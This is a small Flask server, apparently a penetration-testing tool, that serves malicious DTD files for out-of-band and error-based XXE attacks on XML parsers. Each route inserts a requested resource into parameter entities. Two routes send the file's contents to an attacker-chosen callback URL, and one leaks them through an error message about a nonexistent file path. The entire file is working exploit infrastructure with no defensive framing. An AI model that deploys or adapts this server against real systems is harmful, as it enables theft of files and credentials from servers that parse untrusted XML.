from flask import Flask, abort, request, Response

app = Flask(__name__)

app.config['callback'] = ''

@app.route("/oob.dtd", methods=["GET"])
def oob():
    if 'resource' in request.args:
        callback = request.args.get('callback', app.config['callback'])

        xml = '<!ENTITY % ext SYSTEM "' + request.args.get('resource', '') + '"><!ENTITY % eval "<!ENTITY &#x25; oob SYSTEM \'' + callback + '/?x=%ext;\'>">%eval;%oob;'
        return Response(xml, mimetype='text/xml')
    else:
        abort(404, description="Missing external entity parameter 'resource'.")

@app.route("/oob2.dtd", methods=["GET"])
def oob2():
    if 'resource' in request.args:
        callback = request.args.get('callback', app.config['callback'])

        xml = '<!ENTITY % ext SYSTEM "' + request.args.get('resource', '') + '"><!ENTITY % eval "<!ENTITY oob SYSTEM \'' + callback + '/?x=%ext;\'>">%eval;'
        return Response(xml, mimetype='text/xml')
    else:
        abort(404, description="Missing external entity parameter 'resource'.")

@app.route("/error.dtd", methods=["GET"])
def error():
    if 'resource' in request.args:
        xml = '<!ENTITY % ext SYSTEM "' + request.args.get('resource', '') + '"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%ext;\'>">%eval;%error;'
        return Response(xml, mimetype='text/xml')
    else:
        abort(404, description="Missing external entity parameter 'resource'.")
